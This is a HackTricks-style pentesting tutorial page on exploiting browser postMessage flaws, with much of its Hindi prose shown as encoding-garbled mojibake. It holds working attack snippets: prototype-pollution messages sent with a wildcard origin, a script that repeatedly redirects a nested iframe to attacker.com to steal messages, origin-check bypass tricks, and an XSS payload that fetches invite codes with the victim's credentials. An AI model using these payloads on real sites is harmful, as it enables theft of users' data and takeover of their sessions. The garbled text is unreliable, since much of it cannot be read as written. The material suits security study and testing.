# PostMessage Vulnerabilities

## PostMessage Vulnerabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Send **PostMessage**

**PostMessage** ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø **targetOrigin** ‡§è‡§ï '\*' ‡§Ø‡§æ ‡§è‡§ï URL ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•à‡§∏‡•á _https://company.com._\
**‡§¶‡•Ç‡§∏‡§∞‡•á ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø** ‡§Æ‡•á‡§Ç, **‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•á‡§µ‡§≤ ‡§â‡§∏ ‡§°‡•ã‡§Æ‡•á‡§® ‡§™‡§∞ ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** (‡§≠‡§≤‡•á ‡§π‡•Ä ‡§µ‡§ø‡§Ç‡§°‡•ã ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§æ ‡§Æ‡•Ç‡§≤ ‡§Ö‡§≤‡§ó ‡§π‡•ã).\
‡§Ø‡§¶‡§ø **wildcard** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã **‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§°‡•ã‡§Æ‡•á‡§® ‡§™‡§∞ ‡§≠‡•á‡§ú‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§î‡§∞ ‡§Ø‡§π ‡§µ‡§ø‡§Ç‡§°‡•ã ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡•á ‡§Æ‡•Ç‡§≤ ‡§™‡§∞ ‡§≠‡•á‡§ú‡•á ‡§ú‡§æ‡§è‡§Ç‡§ó‡•á‡•§

### Attacking iframe & wildcard in **targetOrigin**

‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø [**‡§á‡§∏ ‡§∞‡§ø‡§™‡•ã‡§∞‡•ç‡§ü**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ‡§Æ‡•á‡§Ç ‡§¨‡§§‡§æ‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§è‡§ï ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§æ‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡•á **iframed** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (‡§ï‡•ã‡§à `X-Frame-Header` ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§®‡§π‡•Ä‡§Ç) ‡§î‡§∞ ‡§ú‡•ã **‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤** ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•ã **postMessage** ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á **wildcard** (\*) ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§≠‡•á‡§ú ‡§∞‡§π‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ **iframe** ‡§ï‡•á **origin** ‡§ï‡•ã **‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ **‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤** ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•ã ‡§è‡§ï ‡§°‡•ã‡§Æ‡•á‡§® ‡§™‡§∞ ‡§≤‡•Ä‡§ï ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§π‡•à‡•§\
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§¶‡§ø ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•ã iframed ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® **targetOrigin** **‡§è‡§ï URL ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§π‡•à ‡§î‡§∞ wildcard ‡§™‡§∞ ‡§®‡§π‡•Ä‡§Ç**, ‡§§‡•ã ‡§Ø‡§π **‡§ö‡§æ‡§≤ ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§ó‡•Ä**‡•§
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener ‡§∂‡•ã‡§∑‡§£

**`addEventListener`** ‡§µ‡§π ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó JS ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§â‡§∏ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ò‡•ã‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡•ã **`postMessages`** ‡§ï‡•Ä **‡§â‡§Æ‡•ç‡§Æ‡•Ä‡§¶ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à**‡•§\
‡§á‡§∏‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® ‡§ï‡•ã‡§° ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Note in this case how the **‡§™‡§π‡§≤‡•Ä ‡§ö‡•Ä‡§ú** that the code is doing is **‡§â‡§§‡•ç‡§™‡§§‡•ç‡§§‡§ø ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡§æ**. This is terribly **‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£** mainly if the page is going to do **‡§ï‡•Å‡§õ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤** with the received information (like changing a password). **‡§Ö‡§ó‡§∞ ‡§Ø‡§π ‡§â‡§§‡•ç‡§™‡§§‡•ç‡§§‡§ø ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§™‡•Ä‡§°‡§º‡§ø‡§§‡•ã‡§Ç ‡§ï‡•ã ‡§á‡§∏ ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü‡•ç‡§∏ ‡§™‡§∞ ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§°‡•á‡§ü‡§æ ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** and change the victims passwords (in this example).

### Enumeration

In order to **‡§á‡§µ‡•á‡§Ç‡§ü ‡§≤‡§ø‡§∏‡•ç‡§®‡§∞‡•ç‡§∏** in the current page you can:

* **‡§ñ‡•ã‡§ú‡•á‡§Ç** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
* **‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç** in the developer tools console: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **‡§ú‡§æ‡§è‡§Ç** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../.gitbook/assets/image (396).png>)

* Use a **‡§¨‡•ç‡§∞‡§æ‡§â‡§ú‡§º‡§∞ ‡§è‡§ï‡•ç‡§∏‡§ü‡•á‡§Ç‡§∂‡§®** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **‡§∏‡§≠‡•Ä ‡§∏‡§Ç‡§¶‡•á‡§∂‡•ã‡§Ç ‡§ï‡•ã ‡§á‡§Ç‡§ü‡§∞‡§∏‡•á‡§™‡•ç‡§ü** and show them to you.

### Origin check bypasses

* **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
*   The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
*   The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

*   Expected Failure:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.
* The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
‡§Ü‡§™ **`e.source`** ‡§ï‡•ã null ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï **iframe** ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã **postMessage** ‡§≠‡•á‡§ú‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§§‡•Å‡§∞‡§Ç‡§§ ‡§π‡§ü‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à**‡•§

‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è **‡§™‡§¢‡§º‡•á‡§Ç:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏

‡§á‡§® ‡§π‡§Æ‡§≤‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§¶‡§∞‡•ç‡§∂ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ü‡§™ **‡§∂‡§ø‡§ï‡§æ‡§∞ ‡§µ‡•á‡§¨ ‡§™‡•É‡§∑‡•ç‡§†** ‡§ï‡•ã ‡§è‡§ï `iframe` ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∞‡§ñ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á‡•§ ‡§≤‡•á‡§ï‡§ø‡§® ‡§ï‡•Å‡§õ ‡§π‡•á‡§°‡§∞ ‡§ú‡•à‡§∏‡•á `X-Frame-Header` ‡§â‡§∏ **‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞** ‡§ï‡•ã **‡§∞‡•ã‡§ï** ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
‡§â‡§® ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç, ‡§Ü‡§™ ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§è‡§ï ‡§ï‡§Æ ‡§õ‡§ø‡§™‡•á ‡§π‡•Å‡§è ‡§π‡§Æ‡§≤‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ü‡§™ ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§µ‡•á‡§¨ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ü‡•à‡§¨ ‡§ñ‡•ã‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Ç‡§µ‡§æ‡§¶ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•ã ‡§¨‡•ç‡§≤‡•â‡§ï ‡§ï‡§∞‡§ï‡•á ‡§¨‡§ö‡•ç‡§ö‡•á ‡§ï‡•ã ‡§≠‡•á‡§ú‡•á ‡§ó‡§è ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•ã ‡§ö‡•Å‡§∞‡§æ‡§®‡§æ

‡§®‡•Ä‡§ö‡•á ‡§¶‡§ø‡§è ‡§ó‡§è ‡§™‡•É‡§∑‡•ç‡§† ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡•à‡§∏‡•á **‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ postmessage ‡§°‡•á‡§ü‡§æ** ‡§ï‡•ã **‡§¨‡§ö‡•ç‡§ö‡•á ‡§ï‡•á iframe** ‡§Æ‡•á‡§Ç ‡§ö‡•Å‡§∞‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, **‡§°‡•á‡§ü‡§æ ‡§≠‡•á‡§ú‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á** **‡§Æ‡•Å‡§ñ‡•ç‡§Ø** ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•ã **‡§¨‡•ç‡§≤‡•â‡§ï** ‡§ï‡§∞‡§ï‡•á ‡§î‡§∞ **‡§¨‡§ö‡•ç‡§ö‡•á ‡§Æ‡•á‡§Ç XSS** ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á **‡§°‡•á‡§ü‡§æ ‡§≤‡•Ä‡§ï** ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe ‡§∏‡•ç‡§•‡§æ‡§® ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ö‡•Å‡§∞‡§æ‡§®‡§æ

‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§¨‡§ø‡§®‡§æ X-Frame-Header ‡§ï‡•á ‡§è‡§ï ‡§µ‡•á‡§¨‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•ã iframe ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§î‡§∞ iframe ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ **‡§â‡§∏ ‡§¨‡§ö‡•ç‡§ö‡•á ‡§ï‡•á iframe ‡§ï‡§æ ‡§∏‡•ç‡§•‡§æ‡§® ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø ‡§Ø‡§π ‡§è‡§ï **postmessage** ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§ú‡•ã **wildcard** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§≠‡•á‡§ú‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§â‡§∏ iframe ‡§ï‡§æ **origin** ‡§è‡§ï ‡§™‡•É‡§∑‡•ç‡§† ‡§Æ‡•á‡§Ç **‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§ú‡•ã ‡§â‡§∏‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§** ‡§π‡•à ‡§î‡§∞ **‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ö‡•Å‡§∞‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage ‡§∏‡•á ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§î‡§∞/‡§Ø‡§æ XSS

‡§â‡§® ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§ú‡§π‡§æ‡§Ç `postMessage` ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≠‡•á‡§ú‡§æ ‡§ó‡§Ø‡§æ ‡§°‡•á‡§ü‡§æ JS ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§Ü‡§™ **‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•ã iframe** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ **‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£/XSS** ‡§ï‡§æ **‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡•ã ‡§ï‡§ø `postMessage` ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≠‡•á‡§ú‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§

**postMessage ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§¨‡§π‡•Å‡§§ ‡§Ö‡§ö‡•ç‡§õ‡•á ‡§∏‡•á ‡§∏‡§Æ‡§ù‡§æ‡§è ‡§ó‡§è XSS** ‡§ï‡•á ‡§ï‡•Å‡§õ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) ‡§™‡§∞ ‡§Æ‡§ø‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

`iframe` ‡§ï‡•á ‡§≤‡§ø‡§è `postMessage` ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á **‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§î‡§∞ ‡§´‡§ø‡§∞ XSS** ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§â‡§¶‡§æ‡§π‡§∞‡§£:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
For **‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä**:

* [**‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£**](../deserialization/nodejs-proto-prototype-pollution/) ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡§æ ‡§≤‡§ø‡§Ç‡§ï
* [**XSS**](../xss-cross-site-scripting/) ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡§æ ‡§≤‡§ø‡§Ç‡§ï
* [**‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§∏‡§æ‡§á‡§° ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§∏‡•á XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡§æ ‡§≤‡§ø‡§Ç‡§ï

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
